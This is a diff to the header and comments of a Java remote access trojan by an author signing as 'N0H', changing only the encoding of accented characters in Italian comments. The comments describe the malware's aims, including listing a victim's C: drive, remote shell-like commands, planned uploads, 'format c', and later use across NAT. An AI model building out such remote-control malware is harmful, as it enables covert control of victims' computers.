@@ -3,20 +3,20 @@ package src;
 /*
  * RAT coded by N0H Java mlwr v b 0.5
  * 
- * nei successivi ritocchi dovrÚ imlpementare file explorer ecc..
+ * nei successivi ritocchi dovr√≤ imlpementare file explorer ecc..
  * per adesso ho aggiunto un nuovo thread con un propio flusso in/out
- * per adesso il flusso del thread Ë solo out dal client e in dal server (posso solo ricevere dal client)
- * ma la funzione non Ë ancora un file transfer vero e propio 
+ * il flusso del thread √® solo out dal client, e in dal server, (posso solo ricevere dal client).
+ * La funzione non √® ancora un file transfer vero e propio 
  * per adesso stampo solamente la directori c:// della vittima) .
  * 
- * e non viceversa , nelle successive versioni implementerÚ la funzione 
+ * e non viceversa , nelle successive versioni implementer√≤ la funzione 
  * in out sia server che client 
  * cosi da poter anche usufruire della funzione di upoload
  * 
  * 
- * nelle versioni successive dovrÚ aggiungere la funzione 
+ * nelle versioni successive dovr√≤ aggiungere la funzione 
  * format c
- * shutdown ecc     //roba da lamer che penso non inserirÚ sinceramente!!
+ * shutdown ecc     //roba da lamer che penso non inserir√≤ sinceramente!!
  * easy job
  * 
  * 
@@ -30,7 +30,7 @@ package src;
  * See U-------!-------------E--------------------------------------7______\_______________________________|
  * N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H 
  * 
- * quando la versione switcher‡ a Alpha settero l app per lavorare in NAT e non piu solo in LAN!!
+ * quando la versione switcher√† a Alpha settero l app per lavorare in NAT e non piu solo in LAN!!
  * 
  */
 
@@ -77,11 +77,11 @@ public static DefaultListModel<String> dlm;
 	static ServerSocket WCSSock;
 	static ServerSocket fTSock;
 	static ServerSocket FTsock;
-	// variabile del metodo che Ë ancora da implementare
+	// variabile del metodo che √® ancora da implementare
 	boolean chatIsVisible = false;
 
 	static int vlistid = 0;
-	// qui suddividerÚ in final tutte le string
+	// qui suddivider√≤ in final tutte le string
 	// per mandare comandi al server
 	// tramite flusso in out del socket, con le string e
 	// con condizioni booleane, che mi permetterano
@@ -94,7 +94,7 @@ public static DefaultListModel<String> dlm;
 	// comandi al server(in questo caso il client) like a shell xD
 	// it works :D
 	/*
-	 * per adesso il metodo descritto sopra Ë l'unico che conosco per far eseguire
+	 * per adesso il metodo descritto sopra √® l'unico che conosco per far eseguire
 	 * comandi al client over network, oviamente i metodi sono istanziati nel client
 	 * e poi vengono richiamati tramite stringe, cosi che il flusso in/out del
 	 * client e del server non funga da sola chat ma anche da stream che attende
